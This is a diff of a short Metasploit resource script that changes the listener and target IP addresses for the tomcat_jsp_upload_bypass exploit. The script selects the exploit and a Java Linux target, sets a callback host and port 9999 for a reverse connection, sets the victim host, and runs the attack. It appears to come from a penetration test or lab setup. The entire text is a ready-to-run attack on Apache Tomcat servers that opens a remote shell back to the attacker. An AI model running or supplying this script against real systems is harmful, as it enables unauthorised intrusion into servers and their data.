@@ -1,6 +1,6 @@
 use exploit/multi/http/tomcat_jsp_upload_bypass
 set TARGET 'Java Linux'
-set LHOST 172.20.52.76
+set LHOST 172.29.1.14
 set LPORT 9999
-set RHOSTS 192.168.8.214
+set RHOSTS 172.29.3.124
 run
